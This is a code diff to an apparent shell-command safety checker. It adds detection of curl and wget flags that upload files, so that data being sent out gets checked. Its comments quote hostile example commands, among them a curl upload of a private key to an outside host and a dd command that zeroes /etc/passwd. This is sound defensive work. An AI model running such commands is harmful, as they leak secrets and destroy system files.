@@ -685,9 +685,16 @@ class Segment:
         # An output flag's value is a path whether or not it looks like one, and the
         # welded spellings never reach `operands` at all -- same reason a redirect
         # target skips the heuristic below.
-        words.extend(target for target in self.output_targets if target not in words)
+        for target in (*self.output_targets, *self.payload_targets):
+            if target not in words:
+                words.append(target)
         words.extend(r.target for r in self.redirects if r.names_a_file)
         return tuple(words)
+
+    @property
+    def payload_targets(self) -> tuple[str, ...]:
+        """Files this segment sends somewhere because a flag named them."""
+        return _payload_targets(self.binary, self.argv)
 
     @property
     def output_targets(self) -> tuple[str, ...]:
@@ -720,6 +727,44 @@ OUTPUT_FLAGS: Mapping[str, tuple[str, ...]] = {
 }
 
 
+#: Flags whose value is a file the program *sends*. The mirror of :data:`OUTPUT_FLAGS`.
+#:
+#: ``curl -T tls.key http://host/`` uploads a private key and nothing looked at it: a
+#: file named behind a flag is not an operand, and a bare filename is not a path, so the
+#: word never reached a check at all. Written ``./tls.key`` the same command is refused,
+#: which is a difference of one character.
+#:
+#: Left out on purpose, because they name a credential used for the TLS *handshake*
+#: rather than a file being sent: ``--key``, ``--cert``, ``--cacert``,
+#: ``--private-key``, ``--certificate``. ``curl --cert client.crt --key client.key
+#: https://api/`` is ordinary mutual-TLS work and refusing it would be the kind of noise
+#: that gets a check switched off.
+#:
+#: Also left out: ``--data-raw``, whose whole point is that ``@`` is literal there
+#: (curl's own help says so); ``--form-string``, whose value is a string by definition;
+#: ``-K``/``--config`` and ``-b``/``--cookie``, which read a file *into* curl rather than
+#: sending it; and wget's ``-i``, which reads a list of URLs.
+PAYLOAD_FLAGS: Mapping[str, tuple[str, ...]] = {
+    "curl": (
+        "-T",
+        "--upload-file",
+        "-d",
+        "--data",
+        "--data-binary",
+        "--data-urlencode",
+        "-F",
+        "--form",
+    ),
+    "wget": ("--post-file", "--body-file"),
+}
+
+#: Payload flags whose value is literal data unless it starts with ``@``. ``-T`` names a
+#: file outright; ``-d hello`` posts the word ``hello``.
+_AT_MARKED_PAYLOAD_FLAGS: frozenset[str] = frozenset(
+    {"-d", "--data", "--data-binary", "--data-urlencode", "-F", "--form"}
+)
+
+
 #: ``dd``'s operands are ``key=value``, and two of those values are paths.
 #:
 #: `dd if=/dev/zero of=/etc/passwd` zeroes the file. The word in the argv is
@@ -743,25 +788,66 @@ def _output_targets(binary: str, argv: Sequence[str]) -> tuple[str, ...]:
     flags = OUTPUT_FLAGS.get(binary)
     if flags is None:
         return ()
-    found: list[str] = []
+    return tuple(value for _flag, value in _flag_values(argv, flags) if value and value != "-")
+
+
+def _flag_values(argv: Sequence[str], flags: Sequence[str]) -> tuple[tuple[str, str], ...]:
+    """Every ``(flag, value)`` pair in ``argv``, in all four spellings.
+
+    ``-o FILE``, ``-oFILE``, ``--output FILE``, ``--output=FILE`` -- a check that reads
+    three of them is a check with a fourth way past it. The flag comes back with the
+    value because what the value *means* depends on it: ``-T`` names a file outright,
+    ``-d`` only names one after an ``@``.
+    """
+    found: list[tuple[str, str]] = []
     index = 1
     while index < len(argv):
         word = argv[index]
         for flag in flags:
             if word == flag:
                 if index + 1 < len(argv):
-                    found.append(argv[index + 1])
+                    found.append((flag, argv[index + 1]))
                     index += 1
                 break
             if word.startswith(f"{flag}="):
-                found.append(word[len(flag) + 1 :])
+                found.append((flag, word[len(flag) + 1 :]))
                 break
             # Only a short flag can carry its value welded on with nothing between.
             if len(flag) == 2 and not flag.startswith("--") and word.startswith(flag):
-                found.append(word[len(flag) :])
+                found.append((flag, word[len(flag) :]))
                 break
         index += 1
-    return tuple(value for value in found if value and value != "-")
+    return tuple(found)
+
+
+def _payload_targets(binary: str, argv: Sequence[str]) -> tuple[str, ...]:
+    """Files this segment sends somewhere, named by a payload flag.
+
+    The mirror of :func:`_output_targets`: that one covers what a command *writes*, this
+    one what it *sends*. Both exist because a file named behind a flag is not an operand
+    and a bare filename is not a path -- so ``curl -T tls.key http://host/`` handed a
+    private key over with nothing having looked at it, while the same key one character
+    differently written, ``./tls.key``, was refused.
+
+    ``-d`` and its relatives take literal data unless it starts with ``@``; ``-F`` takes
+    ``name=@file``. ``-T`` and ``--post-file`` name a file outright. A value of ``-`` is
+    standard input rather than a file called ``-``.
+    """
+    flags = PAYLOAD_FLAGS.get(binary)
+    if flags is None:
+        return ()
+    found: list[str] = []
+    for flag, value in _flag_values(argv, flags):
+        name = value
+        if flag in _AT_MARKED_PAYLOAD_FLAGS:
+            _, marker, after = value.partition("@")
+            if not marker:
+                # Literal data, not a file. `-d hello` posts the word `hello`.
+                continue
+            name = after
+        if name and name != "-":
+            found.append(name)
+    return tuple(found)
 
 
 def _dd_path(binary: str, word: str) -> str | None:
@@ -2175,6 +2261,7 @@ __all__ = [
     "IN_PLACE_EDITORS",
     "IN_PLACE_FLAGS",
     "OUTPUT_FLAGS",
+    "PAYLOAD_FLAGS",
     "PRIVILEGE_ESCALATORS",
     "PROGRAM_INTERPRETERS",
     "SHELL_EXECUTORS",
